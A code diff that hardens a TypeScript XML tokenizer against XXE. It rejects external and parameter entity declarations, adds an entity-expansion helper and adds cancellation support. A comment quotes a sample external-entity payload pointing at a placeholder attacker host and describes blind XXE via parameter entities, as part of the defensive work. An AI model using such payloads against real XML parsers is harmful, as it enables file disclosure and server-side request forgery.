@@ -122,6 +122,7 @@ export type XmlTokenizerErrorCode =
   | 'invalid-encoding'
   | 'external-entity'
   | 'entity-limit'
+  | 'cancelled'
 
 export class XmlTokenizerError extends Error {
   readonly code: XmlTokenizerErrorCode
@@ -356,6 +357,25 @@ function parseCdata(text: string, cursor: Cursor): XmlTextToken {
   }
 }
 
+const ENTITY_NAME_RE = /^[A-Za-z_][A-Za-z0-9_.:-]*/u
+
+function isInternalSubsetWhitespace(char: string | undefined): boolean {
+  return char === ' ' || char === '\n' || char === '\r' || char === '\t'
+}
+
+/**
+ * Scan an internal DOCTYPE subset for `<!ENTITY ...>` declarations.
+ *
+ * This is a hand-written scanner rather than a single regular expression on
+ * purpose: a prior regex-based implementation only matched the *malformed*
+ * external-entity shape `<!ENTITY name SYSTEM>` (missing the mandatory
+ * quoted identifier). Real XXE payloads always include that identifier —
+ * `<!ENTITY xxe SYSTEM "http://attacker.example/evil.dtd">` — which the old
+ * regex silently failed to match at all, so `matchAll` skipped straight past
+ * the declaration instead of rejecting it. Any syntax this scanner does not
+ * explicitly recognize as a safe, bounded, internal-value declaration is
+ * rejected (fail closed) rather than silently ignored.
+ */
 function parseInternalEntities(
   internalSubset: string | null,
   limits: XmlTokenizerLimits,
@@ -363,9 +383,84 @@ function parseInternalEntities(
 ): readonly XmlEntityDeclaration[] {
   if (!internalSubset) return Object.freeze([])
   const declarations: XmlEntityDeclaration[] = []
-  const entityRe = /<!ENTITY\s+([A-Za-z_][A-Za-z0-9_.:-]*)\s+(SYSTEM|PUBLIC|(["'])([\s\S]*?)\3)\s*>/gu
   let totalValueLength = 0
-  for (const match of internalSubset.matchAll(entityRe)) {
+  let index = 0
+
+  const skipWhitespace = (): void => {
+    while (index < internalSubset.length && isInternalSubsetWhitespace(internalSubset[index])) index += 1
+  }
+
+  while (index < internalSubset.length) {
+    const declStart = internalSubset.indexOf('<!ENTITY', index)
+    if (declStart === -1) break
+    index = declStart + '<!ENTITY'.length
+    skipWhitespace()
+
+    // Parameter entities (`<!ENTITY % name ...>`) are not needed by ARIS
+    // AML/XML and are the primary mechanism behind out-of-band/"blind" XXE
+    // and DTD-based expansion attacks. Reject them outright, whether their
+    // declared value would itself have been external or internal.
+    if (internalSubset[index] === '%' && isInternalSubsetWhitespace(internalSubset[index + 1])) {
+      throw new XmlTokenizerError(
+        'external-entity',
+        'Parameter XML entities are not allowed.',
+        start.offset
+      )
+    }
+
+    const nameMatch = ENTITY_NAME_RE.exec(internalSubset.slice(index))
+    if (!nameMatch) {
+      throw new XmlTokenizerError(
+        'malformed-xml',
+        'Malformed <!ENTITY> declaration: expected an entity name.',
+        start.offset
+      )
+    }
+    const name = nameMatch[0]
+    index += name.length
+    skipWhitespace()
+
+    const looksLikeSystem =
+      internalSubset.startsWith('SYSTEM', index) && isInternalSubsetWhitespace(internalSubset[index + 'SYSTEM'.length])
+    const looksLikePublic =
+      internalSubset.startsWith('PUBLIC', index) && isInternalSubsetWhitespace(internalSubset[index + 'PUBLIC'.length])
+    if (looksLikeSystem || looksLikePublic) {
+      throw new XmlTokenizerError(
+        'external-entity',
+        'External XML entities are not allowed.',
+        start.offset
+      )
+    }
+
+    const quote = internalSubset[index]
+    if (quote !== '"' && quote !== "'") {
+      throw new XmlTokenizerError(
+        'malformed-xml',
+        `Malformed <!ENTITY ${name}> declaration: expected a quoted value or an external identifier.`,
+        start.offset
+      )
+    }
+    index += 1
+    const closeQuoteIndex = internalSubset.indexOf(quote, index)
+    if (closeQuoteIndex === -1) {
+      throw new XmlTokenizerError(
+        'malformed-xml',
+        `Unterminated <!ENTITY ${name}> value.`,
+        start.offset
+      )
+    }
+    const value = internalSubset.slice(index, closeQuoteIndex)
+    index = closeQuoteIndex + 1
+    skipWhitespace()
+    if (internalSubset[index] !== '>') {
+      throw new XmlTokenizerError(
+        'malformed-xml',
+        `Malformed <!ENTITY ${name}> declaration: expected ">".`,
+        start.offset
+      )
+    }
+    index += 1
+
     if (declarations.length >= limits.maxEntityDeclarations) {
       throw new XmlTokenizerError(
         'entity-limit',
@@ -373,14 +468,6 @@ function parseInternalEntities(
         start.offset
       )
     }
-    if (match[2] === 'SYSTEM' || match[2] === 'PUBLIC') {
-      throw new XmlTokenizerError(
-        'external-entity',
-        'External XML entities are not allowed.',
-        start.offset
-      )
-    }
-    const value = match[4] ?? ''
     if (value.length > limits.maxEntityValueLength) {
       throw new XmlTokenizerError(
         'entity-limit',
@@ -404,9 +491,9 @@ function parseInternalEntities(
       )
     }
     declarations.push({
-      name: match[1]!,
+      name,
       value,
-      quote: match[3] as '"' | "'",
+      quote,
       span: {
         start,
         end: start
@@ -564,6 +651,51 @@ function parseStartTag(text: string, cursor: Cursor): XmlStartTagToken {
   throwTokenizerError('malformed-xml', 'Unterminated XML start tag.', cursor)
 }
 
+const PREDEFINED_XML_ENTITIES: Readonly<Record<string, string>> = Object.freeze({
+  amp: '&',
+  lt: '<',
+  gt: '>',
+  apos: "'",
+  quot: '"'
+})
+
+const ENTITY_REFERENCE_RE = /&(#x[0-9A-Fa-f]+|#[0-9]+|[A-Za-z_][A-Za-z0-9_.:-]*);/gu
+
+/**
+ * Expand predefined XML entities, numeric character references, and
+ * declared internal entities in previously tokenized raw text/attribute
+ * content. This is a lossless-architecture-safe operation: `raw` spans
+ * recorded by the tokenizer are never mutated, and this function only ever
+ * produces a *new* string for callers that need decoded content (e.g. the
+ * semantic index layer).
+ *
+ * A single, non-recursive replacement pass is sufficient and safe: entity
+ * *declarations* are rejected outright by {@link parseInternalEntities} if
+ * their value contains a reference to another entity, so a declared value
+ * can never itself expand further (expansion depth is bounded at 1).
+ */
+export function expandXmlEntities(
+  raw: string,
+  entityDeclarations: readonly XmlEntityDeclaration[] = []
+): string {
+  const custom = new Map(entityDeclarations.map((declaration) => [declaration.name, declaration.value]))
+  return raw.replace(ENTITY_REFERENCE_RE, (match, reference: string) => {
+    if (reference.startsWith('#x') || reference.startsWith('#X')) {
+      const codePoint = Number.parseInt(reference.slice(2), 16)
+      return Number.isFinite(codePoint) ? String.fromCodePoint(codePoint) : match
+    }
+    if (reference.startsWith('#')) {
+      const codePoint = Number.parseInt(reference.slice(1), 10)
+      return Number.isFinite(codePoint) ? String.fromCodePoint(codePoint) : match
+    }
+    const predefined = PREDEFINED_XML_ENTITIES[reference]
+    if (predefined !== undefined) return predefined
+    const declared = custom.get(reference)
+    if (declared !== undefined) return declared
+    return match
+  })
+}
+
 function resolvedLimits(limits?: Partial<XmlTokenizerLimits>): XmlTokenizerLimits {
   return {
     maxTokens: limits?.maxTokens ?? DEFAULT_XML_TOKENIZER_LIMITS.maxTokens,
@@ -578,10 +710,17 @@ function resolvedLimits(limits?: Partial<XmlTokenizerLimits>): XmlTokenizerLimit
 
 export function tokenizeXmlDocument(
   text: string,
-  limits?: Partial<XmlTokenizerLimits>
+  limits?: Partial<XmlTokenizerLimits>,
+  signal?: AbortSignal
 ): TokenizedXmlDocument {
   const resolved = resolvedLimits(limits)
   const cursor: Cursor = { index: 0, byteOffset: 0, line: 1, column: 1 }
+  const checkCancellation = (): void => {
+    if (signal?.aborted) {
+      throw new XmlTokenizerError('cancelled', 'XML tokenization was cancelled.', cursor.index)
+    }
+  }
+  checkCancellation()
   const tokens: XmlToken[] = []
   const openElements: string[] = []
   const openElementNodes: MutableXmlElementNode[] = []
@@ -623,6 +762,7 @@ export function tokenizeXmlDocument(
   }
 
   while (cursor.index < text.length) {
+    checkCancellation()
     const remaining = text.slice(cursor.index)
     if (remaining.startsWith('<?xml')) {
       if (declaration !== null || tokens.some((token) => token.kind !== 'text' || token.content.trim())) {
